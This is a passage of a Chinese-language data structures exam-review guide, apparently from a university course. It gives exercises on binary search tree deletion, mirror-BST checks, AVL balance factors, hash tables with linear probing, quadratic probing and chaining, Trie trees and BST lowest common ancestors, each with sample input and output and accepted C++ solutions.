BIT[pos].value << ' ';\n\t\tinorder(rs);\n\t}\n}\n\nvoid query(int x, int pos, int cnt)\n{\n\tif (pos == -1)return;\n\tif (x == BIT[pos].value)\n\t{\n\t\tisfind = 1;\n\t\tcout << cnt << endl;\n\t\treturn;\n\t}\n\telse if (x < BIT[pos].value)query(x, BIT[pos].ls, cnt + 1);\n\telse if (x > BIT[pos].value)query(x, BIT[pos].rs, cnt + 1);\n}\n\nint main()\n{\n\tint t, n, m;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tcin >> n;\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tint x;\n\t\t\tcin >> x;\n\t\t\tinsert(x, 0, 0, 0);\n\t\t}\n\t}\n\tinorder(0);\n\tcout << endl;\n\tcin >> m;\n\twhile (m--)\n\t{\n\t\tint x;\n\t\tcin >> x;\n\t\tisfind = 0;\n\t\tquery(x, 0, 1);\n\t\tif (!isfind)cout << \"-1\" << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS二叉排序树之删除\n\n* 二叉排序树的删除\n\n  ```\n  删除二叉排序树中的一个结点后，必须保持二叉排序树的特性（左子树的所有结点值小于根结点，右子树的所有结点值大于根结点）\n  ```\n\n  二叉排序树删除节点的三种情况：\n\n  * 是叶子结点\n\n    直接删除结点，并让其父结点指向该结点的指针变为空\n\n    <img src=\"深圳大学数据结构期末复习与实验代码/image-20230201145148880.png\" alt=\"image-20230201145148880\" style=\"zoom:50%;\" />\n\n  * 只有左子树或右子树\n\n    删除结点,让其父结点指向该结点的指针指向其左子树(或右子树),即用孩子结点替代被删除结点即可\n\n    <img src=\"深圳大学数据结构期末复习与实验代码/image-20230201145218763.png\" alt=\"image-20230201145218763\" style=\"zoom:50%;\" />\n\n  * 同时有左、右子树\n\n    被删除结点p既有左子树，又有右子树\n\n    以中序遍历时的直接前驱s替代被删除结点p（即将两个节点的值替换），然后再删除该直接前驱（只可能有左孩子）\n\n    <img src=\"深圳大学数据结构期末复习与实验代码/image-20230201145352127.png\" alt=\"image-20230201145352127\" style=\"zoom:33%;\" />\n\n  \n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230201145428182.png\" alt=\"image-20230201145428182\" style=\"zoom:50%;\" />\n\n题目:\n\n```\n给出一个数据序列，建立二叉排序树，并实现删除功能\n对二叉排序树进行中序遍历，可以得到有序的数据序列\n\n输入\n第一行输入t，表示有t个数据序列\n第二行输入n，表示首个序列包含n个数据\n第三行输入n个数据，都是自然数且互不相同，数据之间用空格隔开\n第四行输入m，表示要删除m个数据\n从第五行起，输入m行，每行一个要删除的数据，都是自然数\n以此类推输入下一个示例\n\n输出\n第一行输出有序的数据序列，对二叉排序树进行中序遍历可以得到\n从第二行起，输出删除第m个数据后的有序序列，输出m行\n以此类推输出下一个示例的结果\n```\n\n样例：\n\n```\n1\n6\n22 33 55 66 11 44\n3\n66\n22\n77\n```\n\n样例输出：\n\n```\n11 22 33 44 55 66 \n11 22 33 44 55 \n11 33 44 55 \n11 33 44 55 \n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<vector>\nusing namespace std;\n\nstruct node {\n\tint id;\n\tint value;\n\tint fa;\n\tint ls = -1, rs = -1;\n\tbool isdel = 0;\n};\n\nint treenodes = 0;\nbool isfind = 0;\nint last;\nint root = 0;\nvector<node>BIT;\nvector<int>inorderid;\n\nvoid insert(int x, int parents, int state, int pos)\n{\n\tif (BIT.empty() || pos == -1)\n\t{\n\t\tBIT.push_back({ treenodes++,x, parents,-1,-1 });\n\t\tif (state == 1)BIT[parents].ls = treenodes - 1;\n\t\telse if (state == 2)BIT[parents].rs = treenodes - 1;\n\t\treturn;\n\t}\n\telse\n\t{\n\t\t{\n\t\t\tif (x < BIT[pos].value)\n\t\t\t{\n\t\t\t\tinsert(x, pos, 1, BIT[pos].ls);\n\t\t\t}\n\t\t\telse insert(x, pos, 2, BIT[pos].rs);\n\t\t}\n\t}\n}\n\nvoid inorder(int pos)\n{\n\tif (pos == -1)return;\n\tint ls = BIT[pos].ls, rs = BIT[pos].rs;\n\tif (ls == -1 && rs == -1)\n\t{\n\t\tcout << BIT[pos].value << ' ';\n\t\tinorderid.push_back(pos);\n\t}\n\telse\n\t{\n\t\tinorder(ls);\n\t\tcout << BIT[pos].value << ' ';\n\t\tinorderid.push_back(pos);\n\t\tinorder(rs);\n\t}\n}\n\nvoid query(int x, int pos, int cnt)\n{\n\tif (pos == -1)return;\n\tif (x == BIT[pos].value)\n\t{\n\t\tisfind = 1;\n\t\tcout << cnt << endl;\n\t\treturn;\n\t}\n\telse if (x < BIT[pos].value)query(x, BIT[pos].ls, cnt + 1);\n\telse if (x > BIT[pos].value)query(x, BIT[pos].rs, cnt + 1);\n}\n\nvoid delnode(int x, int pos, int parent, int state)\n{\n\tif (pos == -1)return;\n\tif (x == BIT[pos].value)\n\t{\n\t\tint last;\n\t\tfor (int i = 0; i < inorderid.size(); i++)\n\t\t{\n\t\t\tif (inorderid[i] == pos)last = inorderid[i - 1];\n\t\t}\n\n\t\tif (BIT[pos].ls == -1 && BIT[pos].rs == -1)\n\t\t{\n\t\t\tif (state == 0)root = -1;\n\t\t\telse if (state == 1)BIT[parent].ls = -1;\n\t\t\telse if (state == 2)BIT[parent].rs = -1;\n\t\t}\n\t\telse if (BIT[pos].ls == -1)\n\t\t{\n\t\t\tif (state == 0)root = BIT[pos].rs; //根节点被删\n\t\t\telse if (state == 1)BIT[parent].ls = BIT[pos].rs;\n\t\t\telse if (state == 2)BIT[parent].rs = BIT[pos].rs;\n\t\t}\n\t\telse if (BIT[pos].rs == -1)\n\t\t{\n\t\t\tif (state == 0)root = BIT[pos].ls;\n\t\t\telse if (state == 1)BIT[parent].ls = BIT[pos].ls;\n\t\t\telse if (state == 2)BIT[parent].rs = BIT[pos].ls;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tBIT[pos].value = BIT[last].value;  //当前值更改为中序的前驱值\n\t\t\tif (BIT[last].ls != -1)\n\t\t\t{\n\t\t\t\tBIT[BIT[last].fa].rs = BIT[last].ls;\n\t\t\t}\n\t\t\telse if (last == BIT[pos].ls)\n\t\t\t{\n\t\t\t\tBIT[pos].ls = -1;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tBIT[BIT[last].fa].rs = -1;\n\t\t\t}\n\t\t}\n\t}\n\telse\n\t{\n\t\tif (x < BIT[pos].value)delnode(x, BIT[pos].ls, pos, 1);\n\t\telse if (x > BIT[pos].value)delnode(x, BIT[pos].rs, pos, 2);\n\t}\n}\n\nint main()\n{\n\tint t, n, m;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tcin >> n;\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tint x;\n\t\t\tcin >> x;\n\t\t\tinsert(x, 0, 0, 0);\n\t\t}\n\t}\n\tinorder(root);\n\tcout << endl;\n\tcin >> m;\n\twhile (m--)\n\t{\n\t\tint x;\n\t\tcin >> x;\n\t\tdelnode(x, 0, 0, 0);\n\t\tinorderid.clear();\n\t\tinorder(root);\n\t\tcout << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 搜索树判断\n\n题目:\n\n```\n对于二叉搜索树，我们规定任一结点的左子树仅包含严格小于该结点的键值，而其右子树包含大于或等于该结点的键值。如果我们交换每个节点的左子树和右子树，得到的树叫做镜像二叉搜索树。\n现在我们给出一个整数键值序列，请编写程序判断该序列是否为某棵二叉搜索树或某镜像二叉搜索树的前序遍历序列，如果是，则输出对应二叉树的后序遍历序列。\n\n输入\n输入的第一行包含一个正整数N（≤1000），第二行包含N个整数，为给出的整数键值序列，数字间以空格分隔。\n\n输出\n输出的第一行首先给出判断结果，如果输入的序列是某棵二叉搜索树或某镜像二叉搜索树的前序遍历序列，则输出YES，否侧输出NO。如果判断结果是YES，下一行输出对应二叉树的后序遍历序列。数字间以空格分隔，但行尾不能有多余的空格。\n```\n\n样例：\n\n```\n7\n8 6 5 7 10 8 11\n```\n\n样例输出：\n\n```\nYES\n5 7 6 8 11 10 8\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<vector>\n#include<string>\nusing namespace std;\n\nstruct node\n{\n\tint id;\n\tint value;\n\tint ls = -1, rs = -1;\n};\n\nint treenodes = 0;\nvector<node>BIT;\nstring pre = \"\", mirrorpre = \"\";\n\nvoid insert(int x, int parents, int state, int pos)\n{\n\tif (BIT.empty() || pos == -1)\n\t{\n\t\tBIT.push_back({ treenodes++,x,-1,-1 });\n\t\tif (state == 1)BIT[parents].ls = treenodes - 1;\n\t\telse if (state == 2)BIT[parents].rs = treenodes - 1;\n\t\treturn;\n\t}\n\telse\n\t{\n\t\t{\n\t\t\tif (x < BIT[pos].value)\n\t\t\t{\n\t\t\t\tinsert(x, pos, 1, BIT[pos].ls);\n\t\t\t}\n\t\t\telse insert(x, pos, 2, BIT[pos].rs);\n\t\t}\n\t}\n}\n\nvoid preorder(int pos)\n{\n\tif (pos == -1)return;\n\tif (BIT[pos].ls == -1 && BIT[pos].rs == -1)\n\t{\n\t\tpre += to_string(BIT[pos].value);\n\t\treturn;\n\t}\n\tpre += to_string(BIT[pos].value);\n\tpreorder(BIT[pos].ls);\n\tpreorder(BIT[pos].rs);\n}\n\nvoid mirror_preorder(int pos)\n{\n\tif (pos == -1)return;\n\tif (BIT[pos].ls == -1 && BIT[pos].rs == -1)\n\t{\n\t\tmirrorpre += to_string(BIT[pos].value);\n\t\treturn;\n\t}\n\tmirrorpre += to_string(BIT[pos].value);\n\tmirror_preorder(BIT[pos].rs);\n\tmirror_preorder(BIT[pos].ls);\n}\n\nvoid postorder(int pos)\n{\n\tif (pos == -1)return;\n\tif (BIT[pos].ls == -1 && BIT[pos].rs == -1)\n\t{\n\t\tcout << BIT[pos].value << ' ';\n\t\treturn;\n\t}\n\tpostorder(BIT[pos].ls);\n\tpostorder(BIT[pos].rs);\n\tcout << BIT[pos].value << ' ';\n}\n\nint main()\n{\n\tint n;\n\tcin >> n;\n\tstring str;\n\tint flag = 0;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tint x;\n\t\tcin >> x;\n\t\tinsert(x, 0, 0, 0);\n\t\tstr += to_string(x);\n\t}\n\tpreorder(0);\n\tmirror_preorder(0);\n\tif (str == pre || str == mirrorpre)\n\t{\n\t\tflag = 1;\n\t}\n\tif (!flag)cout << \"NO\" << endl;\n\telse\n\t{\n\t\tcout << \"YES\" << endl;\n\t\tpostorder(0);\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 平衡二叉树（AVL）\n\n特点：树中每个结点的左、右子树深度之差的绝对值不大于1，即$|h_L-h_R|≤1$\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230201150247294.png\" alt=\"image-20230201150247294\" style=\"zoom:50%;\" />\n\n* 平衡因子：节点左子树最大深度与右子树最大深度的差\n\n  AVL树任一结点平衡因子只能取 -1, 0, 1\n\n##### 平衡二叉树的平衡化（旋转）\n\n每插入一个新结点时, AVL树中相关结点的平衡状态会发生改变。\n\n发现失衡后，在失衡节点沿插入节点方向往前回溯两层的节点进行旋转\n\n* 单向旋转\n\n  单向左旋：RR型，'\\\\'\n\n  <img src=\"深圳大学数据结构期末复习与实验代码/image-20230201151236644.png\" alt=\"image-20230201151236644\" style=\"zoom: 50%;\" />\n\n  单向右旋：LL型，'/'\n\n  <img src=\"深圳大学数据结构期末复习与实验代码/image-20230201151251711.png\" alt=\"image-20230201151251711\" style=\"zoom:50%;\" />\n\n* 双向旋转\n\n  先左后右：LR型，'<'\n\n  <img src=\"深圳大学数据结构期末复习与实验代码/image-20230201151410732.png\" alt=\"image-20230201151410732\" style=\"zoom:50%;\" />\n\n  先右后左：RL型，'>'\n\n  <img src=\"深圳大学数据结构期末复习与实验代码/image-20230201151425394.png\" alt=\"image-20230201151425394\" style=\"zoom:50%;\" />\n\n\n\n* 平衡二叉树的删除：与二叉排序树的删除相同，但每次删除后要检查是否失衡并进行平衡化处理\n\n\n\n#### DS查找—二叉树平衡因子\n\n与计算树高类似\n\n题目:\n\n```\n二叉树用数组存储，将二叉树的结点数据依次自上而下,自左至右存储到数组中，一般二叉树与完全二叉树对比，比完全二叉树缺少的结点在数组中用0来表示。\n计算二叉树每个结点的平衡因子，并按后序遍历的顺序输出结点的平衡因子。\n\n--程序要求--\n若使用C++只能include一个头文件iostream；若使用C语言只能include一个头文件stdio\n程序中若include多过一个头文件，不看代码，作0分处理\n不允许使用第三方对象或函数实现本题的要求\n\n输入\n测试次数t\n每组测试数据一行，数组元素个数n，后跟n个字符，二叉树的数组存储。\n\n输出\n对每组测试数据，按后序遍历的顺序输出树中结点的平衡因子（测试数据没有空树）\n```\n\n样例：\n\n```\n2\n6 ABC00D\n24 ABCD0EF0000H00000000000I\n```\n\n样例输出：\n\n```\nB 0\nD 0\nC 1\nA -1\nD 0\nB 1\nI 0\nH 1\nE 2\nF 0\nC 2\nA -2\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<map>\nusing namespace std;\n\nint t;\nint n;\nstring BIT;\nmap<char, int>balance;\n\nint calbalance(string tree, int pos, int dep)\n{\n\tif (pos > n || tree[pos] == '0')\n\t{\n\t\treturn dep - 1;\n\t}\n\tint lh = calbalance(tree, pos << 1, dep + 1);\n\tint rh = calbalance(tree, pos << 1 | 1, dep + 1);\n\tbalance[tree[pos]] = lh - rh;\n\treturn max(lh, rh);\n}\n\nvoid postorder(string tree, int pos)\n{\n\tif (pos > n || tree[pos] == '0')\n\t{\n\t\treturn;\n\t}\n\tpostorder(tree, pos << 1);\n\tpostorder(tree, pos << 1 | 1);\n\tcout << tree[pos] << ' ' << balance[tree[pos]] << endl;\n}\n\nint main()\n{\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tBIT.clear();\n\t\tstring str;\n\t\tcin >> n >> str;\n\t\tBIT = \" \" + str;\n\n\t\tcalbalance(BIT, 1, 0);\n\t\tpostorder(BIT, 1);\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### 哈希表\n\n##### 哈希表处理冲突的方法\n\n* 开放地址法\n\n  <img src=\"深圳大学数据结构期末复习与实验代码/image-20230201152001770.png\" alt=\"image-20230201152001770\" style=\"zoom:50%;\" />\n\n  * 线性探测再散列：\n  * <img src=\"深圳大学数据结构期末复习与实验代码/image-20230201152053214.png\" alt=\"image-20230201152053214\" style=\"zoom:50%;\" />\n  * 二次探测再散列：\n  * <img src=\"深圳大学数据结构期末复习与实验代码/image-20230201152109025.png\" alt=\"image-20230201152109025\" style=\"zoom:50%;\" />\n\n  特点：\n\n  ```\n  优点：线性探测再散列只要哈希表中有空位置，总能找到一个不发生冲突的地址\n  二次探测再散列：m=4j+3的素数时总能找到。\n  缺点：易产生“二次聚集”，即在处理同义词的冲突过程中，又添加了非同义词的冲突(如36)，对查找不利\n  ```\n\n* 再哈希\n\n  <img src=\"深圳大学数据结构期末复习与实验代码/image-20230201152204978.png\" alt=\"image-20230201152204978\" style=\"zoom:50%;\" />\n\n* 链地址法：将所有哈希地址相同的记录都链接在同一链表中\n\n  <img src=\"深圳大学数据结构期末复习与实验代码/image-20230201152242809.png\" alt=\"image-20230201152242809\" style=\"zoom:50%;\" />\n\n#####哈希表的装填因子\n\n哈希表的装填因子是哈希表中填入的记录数与哈希表的长度的比值，即：\n\n$ α = 哈希表中填入的记录数 / 哈希表的长度$\n\n直观来看，装填因子α越小，发生冲突的可能性就越小；装填因子α越大，发生冲突的可能性就越大\n\n\n\n##### 哈希查找的ASL（理论平均ASL）\n\n线性探测再散列的哈希表查找成功时：\n\n$ ASL ≈ (½)(1 + 1/(1-α))$\n\n二次探测再散列的哈希表查找成功时：\n\n$ ASL ≈ -(1/α)ln(1-α)$\n\n链地址法处理冲突的哈希表查找成功时：\n\n$ ASL ≈ (1 + α/2)$\n\n\n\n#### DS哈希查找—线性探测再散列\n\n题目:\n\n```\n定义哈希函数为H(key) = key%11，输入表长（大于、等于11）。输入关键字集合，用线性探测再散列构建哈希表，并查找给定关键字。\n\n--程序要求--\n若使用C++只能include一个头文件iostream；若使用C语言只能include一个头文件stdio\n程序中若include多过一个头文件，不看代码，作0分处理\n不允许使用第三方对象或函数实现本题的要求\n\n输入\n测试次数t\n每组测试数据为：\n哈希表长m、关键字个数n\nn个关键字\n查找次数k\nk个待查关键字\n\n输出\n对每组测试数据，输出以下信息：\n构造的哈希表信息，数组中没有关键字的位置输出NULL\n对k个待查关键字，分别输出：0或1（0—不成功，1—成功）、比较次数、查找成功的位置（从1开始）\n```\n\n样例：\n\n```\n1\n12 10\n22 19 21 8 9 30 33 4 15 14\n4\n22\n56\n30\n17\n```\n\n样例输出：\n\n```\n22 30 33 14 4 15 NULL NULL 19 8 21 9\n1 1 1\n0 6\n1 6 2\n0 1\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\nusing namespace std;\n\nint key[100];\nint Hash[100];\n\nvoid init()\n{\n\tfor (int i = 0; i < 100; i++)key[i] = 0, Hash[i] = -1;\n}\n\nvoid printhashtable(int m)\n{\n\tfor (int i = 0; i < m; i++)\n\t{\n\t\tif (Hash[i] == -1)cout << \"NULL\";\n\t\telse cout << Hash[i];\n\n\t\tif (i == m - 1)cout << endl;\n\t\telse cout << ' ';\n\t}\n}\n\nvoid createhash(int m, int n)\n{\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tint hashval = key[i] % 11;\n\t\tif (Hash[hashval] == -1)\n\t\t{\n\t\t\tHash[hashval] = key[i];\n\t\t}\n\t\telse\n\t\t{\n\t\t\twhile (Hash[hashval] != -1)\n\t\t\t{\n\t\t\t\thashval = (hashval + 1) % m;\n\t\t\t}\n\t\t\tHash[hashval] = key[i];\n\t\t}\n\t}\n}\n\nvoid search(int x, int m)\n{\n\tint cnt = 1;\n\tint index = 0;\n\tbool flag = 0;\n\n\tint hashval = x % 11;\n\twhile(Hash[hashval] != x)\n\t{\n\t\tif (Hash[hashval] == -1 || Hash[hashval] == x)break;\n\t\tcnt++;\n\t\thashval = (hashval + 1) % m;\n\t}\n\tif (Hash[hashval] == x)flag = 1, index = hashval + 1;\n\n\tif (flag)cout << 1 << ' ' << cnt << ' ' << index << endl;\n\telse cout << 0 << ' ' << cnt << endl;\n}\n\nint main()\n{\n\tint t, n, m, k;\n\tcin >> t;\n\twhile (t--)\n\t{\n\t\tinit();\n\t\tcin >> m >> n;\n\t\tfor (int i = 0; i < n; i++)\n\t\t{\n\t\t\tcin >> key[i];\n\t\t}\n\t\tcreatehash(m, n);\n\t\tprinthashtable(m);\n\t\tcin >> k;\n\t\twhile (k--)\n\t\t{\n\t\t\tint x;\n\t\t\tcin >> x;\n\t\t\tsearch(x, m);\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS哈希查找—二次探测再散列\n\n题目:\n\n```\n定义哈希函数为H(key) = key%11。输入表长（大于、等于11），输入关键字集合，用二次探测再散列构建哈希表，并查找给定关键字。\n\n\n输入\n测试次数t\n每组测试数据格式如下：\n哈希表长m、关键字个数n\nn个关键字\n查找次数k\nk个待查关键字\n\n输出\n对每组测试数据，输出以下信息：\n构造的哈希表信息，数组中没有关键字的位置输出NULL\n对k个待查关键字，分别输出：\n0或1（0—不成功，1—成功）、比较次数、查找成功的位置（从1开始）\n```\n\n样例：\n\n```\n1\n12 10\n22 19 21 8 9 30 33 4 41 13\n4\n22\n15\n30\n41\n```\n\n样例输出：\n\n```\n22 9 13 NULL 4 41 NULL 30 19 8 21 33\n1 1 1\n0 3\n1 3 8\n1 6 6\n```\n\nAC代码：\n\n```cpp\n#include <iostream>\n#include<cstring>\nusing namespace std;\n\nint Hash[1005];\n\nstruct node\n{\n    int index, cnt; //下标，查找次数\n};//用于返回搜索结果\n\nvoid init()\n{\n    for (int i = 0; i < 1005; i++)Hash[i] = -1;\n}\n\nint insert(int pos, int m, int value)\n{\n    if (Hash[pos] == value)\n    {\n        return pos;\n    }\n    for (int i = 1; i * i <= m; ++i)\n    {\n        int d = i * i;\n        if (Hash[(pos + i * i) % m] == value)\n        {\n            return (pos + d) % m;\n        }\n        if (Hash[(pos - i * i + m) % m] == value)\n        {\n            return  (pos - d + m) % m;\n        }\n    }\n    return -1;\n}\n\nnode search(int pos, int m, int value) //在读取到空停止\n{\n    if (Hash[pos] == value)\n    {\n        return { pos, 1 };\n    }\n    int i, d;\n    for (i = 1; i * i <= m; ++i)\n    {\n        d = i * i;\n        if (Hash[(pos + d) % m] == value)\n        {\n            return { (pos + d) % m, i * 2 };\n        }\n        if (Hash[(pos + d) % m] == -1) //多加一个表长放置负数出问题\n        {\n            return { -1, i * 2 };\n        }//正向\n\n        if (Hash[(pos - d + m) % m] == value)\n        {\n            return { (pos - d + m) % m, i * 2 + 1 };\n        }\n        if (Hash[(pos - d + m) % m] == -1)\n        {\n            return { -1, i * 2 + 1 };\n        }//反向\n    }\n    return { -1, i * 2 + 1 };\n}\n\nvoid printHashtable(int m)\n{\n    for (int i = 0; i < m; ++i)\n    {\n        if (Hash[i] == -1)\n        {\n            cout << \"NULL\";\n        }\n        else\n        {\n            cout << Hash[i];\n        }\n        \n        if (i == m - 1)cout << endl;\n        else cout << ' ';\n    }\n}\n\nint main()\n{\n    int t;\n    cin >> t;\n    while (t--)\n    {\n        init();\n        int m;\n        int n;\n        cin >> m >> n;\n        for (int i = 0; i < n; ++i)\n        {\n            int k;\n            cin >> k;\n            int hashval = k % 11;\n            int ind = insert(hashval, m, -1); //初始value为-1表示若找到的为空直接插入\n            Hash[ind] = k;\n        }\n        printHashtable(m);\n        int k;\n        cin >> k;\n        for (int i = 0; i < k; ++i)\n        {\n            int s;\n            cin >> s;\n            int hashval = s % 11;\n            node result = search(hashval, m, s);\n            if (result.index == -1)\n            {\n                cout << 0 << ' ' << result.cnt << endl;\n            }\n            else\n            {\n                cout << 1 << ' ' << result.cnt << ' ' << result.index + 1 << endl;\n            }\n        }\n    }\n    return 0;\n}\n```\n\n\n\n#### DS哈希查找--链地址法(表头插入)\n\n题目:\n\n```\n给出一个数据序列，建立哈希表，采用求余法作为哈希函数，模数为11，哈希冲突用链地址法和表头插入\n如果首次查找失败，就把数据插入到相应的位置中\n实现哈希查找功能\n\n输入\n第一行输入n，表示有n个数据\n第二行输入n个数据，都是自然数且互不相同，数据之间用空格隔开\n第三行输入t，表示要查找t个数据\n从第四行起，每行输入一个要查找的数据，都是正整数\n\n输出\n每行输出对应数据的查找结果\n```\n\n样例：\n\n```\n6\n11 23 39 48 75 62\n6\n39\n52\n52\n63\n63\n52\n```\n\n样例输出：\n\n```\n6 1\nerror\n8 1\nerror\n8 1\n8 2\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<vector>\nusing namespace std;\n\nvector<int>Hashtable[11];\n\nvoid insert(int x)\n{\n\tint hashval = x % 11;\n\tif (Hashtable[hashval].empty())Hashtable[hashval].push_back(x);\n\telse Hashtable[hashval].insert(Hashtable[hashval].begin(), x);\n}\n\nint search(int x)\n{\n\tint hashval = x % 11;\n\tif (Hashtable[hashval].empty())\n\t{\n\t\tHashtable[hashval].insert(Hashtable[hashval].begin(), x);\n\t\treturn -1;\n\t}\n\telse\n\t{\n\t\tint cnt = 0;\n\t\tfor (auto i : Hashtable[hashval])\n\t\t{\n\t\t\tcnt++;\n\t\t\tif (i == x)return cnt;\n\t\t}\n\t}\n\tHashtable[hashval].insert(Hashtable[hashval].begin(), x);\n\treturn -1;\n}\n\nint main()\n{\n\tint n, t;\n\tcin >> n;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tint x;\n\t\tcin >> x;\n\t\tinsert(x);\n\t}\n\tcin >> n;\n\twhile (n--)\n\t{\n\t\tint x;\n\t\tcin >> x;\n\t\tint ans = search(x);\n\t\tif (ans == -1)cout << \"error\" << endl;\n\t\telse cout << x % 11 << ' ' << ans << endl;\n\t}\n\treturn 0;\n}\n```\n\n\n\n#### DS哈希查找--Trie树\n\n题目:\n\n````\nTrie树又称单词查找树，是一种树形结构，如下图所示。\n````\n\n\n\n<img src=\"深圳大学数据结构期末复习与实验代码/image-20230130113311828.png\" alt=\"image-20230130113311828\" style=\"zoom: 80%;\" />\n\n```\n它是一种哈希树的变种。典型应用是用于统计，排序和保存大量的字符串（但不仅限于字符串），所以经常被搜索引擎系统用于文本词频统计。它的优点是：利用字符串的公共前缀来节约存储空间，最大限度地减少无谓的字符串比较，查询效率比哈希表高。\n输入的一组单词，创建Trie树。输入字符串，计算以该字符串为公共前缀的单词数。\n（提示：树结点有26个指针，指向单词的下一字母结点。）\n\n输入\n测试数据有多组\n每组测试数据格式为：\n第一行：一行单词，单词全小写字母，且单词不会重复，单词的长度不超过10\n第二行：测试公共前缀字符串数量t\n后跟t行，每行一个字符串\n\n输出\n每组测试数据输出格式为：\n第一行：创建的Trie树的层次遍历结果\n第2~t+1行：对每行字符串，输出树中以该字符串为公共前缀的单词数。\n```\n\n样例：\n\n```\nabcd abd bcd efg hig\n3\nab\nbc\nabcde\n```\n\n样例输出：\n\n```\nabehbcficddggd\n2\n1\n0\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<queue>\n#include<cstring>\n#include<string>\nusing namespace std;\n\nint n, m, len, tot = 0;\nchar s[1001];\nint trie[1001][26]; //存节点编号\nbool vis[1001][1001];\nint w[1001];\n\nvoid init()\n{\n    memset(s, 0, sizeof s);\n    memset(trie, 0, sizeof trie);\n    memset(vis, 0, sizeof vis);\n}\n\nvoid insert(string s)\n{\n    int rt = 0;\n    for (int i = 0; i < s.size(); i++)\n    {\n        int v = s[i] - 'a';\n        if (!trie[rt][v])\n        {\n            trie[rt][v] = ++tot;\n        }\n        rt = trie[rt][v];\n    }\n}\n\nvoid levelorder(int root)\n{\n    queue<pair<int,char> >q;\n    q.push({ root,' ' });\n    while (!q.empty())\n    {\n        pair<int, char>tmp = q.front();\n        int front = q.front().first;\n        q.pop();\n        for (int i = 0; i < 26; i++)\n        {\n            if (trie[front][i])q.push({trie[front][i], (char)(i + 'a')});\n        }\n        if (front)cout << tmp.second;\n    }\n}\n\nint calw(int pos)\n{\n    int cnt = 0;\n    for (int i = 0; i < 26; i++)\n    {\n        if (trie[pos][i])cnt += calw(trie[pos][i]);\n    }\n    if (!cnt)cnt = 1;\n    w[pos] = cnt;\n    return cnt;\n}\n\nint query(string s)\n{\n    int rt = 0;\n    int cnt = 0;\n    for (int i = 0; i < s.size(); i++)\n    {\n        int v = s[i] - 'a';\n        if (!trie[rt][v]) \n        {\n            return 0;\n        }\n        rt = trie[rt][v];\n    }\n    return w[rt];\n}\n\nint main()\n{\n    string str;\n    while (getline(cin, str))\n    {\n        init();\n        int index = str.find(' ');\n        string tmp;\n        while (index != -1)\n        {\n            tmp = str.substr(0, index);\n            insert(tmp);\n            str = str.substr(index + 1);\n            index = str.find(' ');\n        }\n        insert(str);\n        calw(0);\n        levelorder(0);\n        cout << endl;;\n        int t;\n        cin >> t;\n        while (t--)\n        {\n            cin >> str;\n            cout << query(str) << endl;\n        }\n    }\n    return 0;\n}\n```\n\n\n\n#### 二叉搜索树的最近公共祖先\n\n题目:\n\n```\n给定一棵二叉搜索树的先序遍历序列，要求你找出任意两结点的最近公共祖先结点（简称 LCA）。\n\n输入\n输入的第一行给出两个正整数：待查询的结点对数 M（≤ 1 000）和二叉搜索树中结点个数 N（≤ 10 000）。随后一行给出 N 个不同的整数，为二叉搜索树的先序遍历序列。最后 M 行，每行给出一对整数键值 U 和 V。所有键值都在整型int范围内。\n\n输出\n对每一对给定的 U 和 V，如果找到 A 是它们的最近公共祖先结点的键值，则在一行中输出 LCA of U and V is A.。但如果 U 和 V 中的一个结点是另一个结点的祖先，则在一行中输出 X is an ancestor of Y.，其中 X 是那个祖先结点的键值，Y 是另一个键值。如果 二叉搜索树中找不到以 U 或 V 为键值的结点，则输出 ERROR: U is not found. 或者 ERROR: V is not found.，或者 ERROR: U and V are not found.。\n```\n\n样例：\n\n```\n6 8\n6 3 1 2 5 4 8 7\n2 5\n8 7\n1 9\n12 -3\n0 8\n99 99\n```\n\n样例输出：\n\n```\nLCA of 2 and 5 is 3.\n8 is an ancestor of 7.\nERROR: 9 is not found.\nERROR: 12 and -3 are not found.\nERROR: 0 is not found.\nERROR: 99 and 99 are not found.\n```\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<vector>\nusing namespace std;\n\nstruct node {\n\tint id;\n\tint value;\n\tint ls = -1, rs = -1;\n\tint fa = -1;\n\tint depth;\n};\n\nint treenodes = 0;\nbool isfind = 0;\nvector<node>BIT;\n\nvoid insert(int x, int parents, int state, int pos, int dep)\n{\n\tif (BIT.empty() || pos == -1)\n\t{\n\t\tBIT.push_back({ treenodes++,x,-1,-1, parents, dep });\n\t\tif (state == 1)BIT[parents].ls = treenodes - 1;\n\t\telse if (state == 2)BIT[parents].rs = treenodes - 1;\n\t\treturn;\n\t}\n\telse\n\t{\n\t\t{\n\t\t\tif (x < BIT[pos].value)\n\t\t\t{\n\t\t\t\tinsert(x, pos, 1, BIT[pos].ls, dep + 1);\n\t\t\t}\n\t\t\telse insert(x, pos, 2, BIT[pos].rs, dep + 1);\n\t\t}\n\t}\n}\n\n\nint query(int x, int pos)\n{\n\tint ls = -1, rs = -1;\n\tif (pos == -1)return -1;\n\tif (x == BIT[pos].value)\n\t{\n\t\treturn BIT[pos].id;\n\t}\n\telse if (x < BIT[pos].value)ls = query(x, BIT[pos].ls);\n\telse if (x > BIT[pos].value)rs = query(x, BIT[pos].rs);\n\tif (ls != -1)return ls;\n\tif (rs != -1)return rs;\n\treturn -1;\n}\n\nvoid findLCA(int a, int b, int x, int y)\n{\n\tif (a == -1 && b == -1)\n\t{\n\t\tcout << \"ERROR: \" << x << \" and \" << y << \" are not 